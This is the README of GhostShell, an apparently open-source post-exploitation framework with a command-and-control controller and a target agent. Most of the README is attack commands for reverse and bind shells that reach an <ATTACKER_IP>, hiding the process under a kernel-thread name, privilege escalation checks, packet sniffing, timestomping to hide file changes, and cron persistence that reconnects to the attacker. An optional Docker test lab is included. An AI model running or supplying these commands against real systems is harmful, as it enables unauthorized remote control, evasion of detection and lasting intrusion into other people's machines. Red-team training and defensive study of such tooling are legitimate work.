# 👻 GhostShell

## Summary

GhostShell is a lightweight post-exploitation and operating system manipulation framework designed strictly for Red Teaming and educational purposes.

**Major update (v3.0):** the project is split into two components:
1. **Controller (`main.py`)** – runs on the operator machine and provides the CLI interface.
2. **Agent (`agent.py`)** – standalone payload with **zero dependencies** (standard library only).

## 🏗️ Architecture

| Component | File | Role | Dependencies |
|---|---|---|---|
| **Controller** | `main.py` | Operator interface (C2) | `typer`, `rich`, `setproctitle` |
| **Agent** | `agent.py` | Target payload | **None** (Standard Lib) |

---

## ✅ Requirements

- Python 3.8+ (Controller and Agent)
- Network connectivity between operator and target
- Docker (optional, for the test lab)

---

## 🚀 Installation

### 1) Operator machine (Windows/Linux/macOS)

```bash
git clone https://github.com/MariusZmr/GhostShell.git
cd GhostShell
pip install -r requirements.txt
```

### 2) Target machine

No installation required. Transfer only `agent.py`.

```bash
# Example transfer to a container
docker cp agent.py <container_id>:/tmp/agent.py
```

---

## ⚙️ Core Features

- Reverse shell (target initiates connection)
- Bind shell (target exposes a port, operator connects)
- Process masquerading (custom name in listings)
- Local audit (quick privilege escalation checks)
- Network sniffer (requires root)
- Timestomping (timestamp modification)
- Persistence (restart on boot)

---

## 🎮 Usage (quick scenarios)

### 1) Reverse Shell (standard)

**Operator:**
```bash
python main.py listener --port 4444
```

**Target:**
```bash
python3 agent.py connect <ATTACKER_IP> --port 4444
```

### 2) Bind Shell (fallback)

**Target:**
```bash
python3 agent.py listen --port 5555
```

**Operator:**
```bash
python main.py handler <VICTIM_IP> 5555
```

### 3) Process masquerading

**Target:**
```bash
python3 agent.py connect <ATTACKER_IP> --name "kworker/u4:0"
```
*Note: Uses `ctypes` + `prctl` on Linux. No external libraries required.*

### 4) Local audit

**Target:**
```bash
python3 agent.py audit
```
- Checks kernel versions for Dirty Pipe/Cow
- Scans for risky SUID binaries (GTFOBins)

### 5) Network sniffer

**Target:**
```bash
python3 agent.py sniff --interface eth0 --count 20
```
*If `eth0` is not found, the agent lists available interfaces.*

### 6) Timestomping

**Target:**
```bash
python3 agent.py timestomp /path/to/file.py --ref /bin/bash
```

### 7) Persistence

**Target:**
```bash
python3 agent.py persist --method cron --payload "python3 /tmp/agent.py connect <ATTACKER_IP>"
```

---

## 🧪 Container usage (test lab)

For safe testing without a second physical machine, use Docker.

```bash
# 1) Start the target container
docker-compose up -d --build

# 2) Enter the container (target simulation)
docker-compose exec ghostshell bash

# 3) (Inside container) Run the agent
python3 agent.py connect host.docker.internal
```

**Helpful notes:**
- `host.docker.internal` works on Windows/macOS. On Linux, use the host IP.
- If you need test traffic, run simple commands like `curl` or `wget` inside the container.

---

## ⚖️ Disclaimer

This software is provided **strictly for educational purposes**. The author is not responsible for any unauthorized use. Use only on systems you explicitly have permission to test.
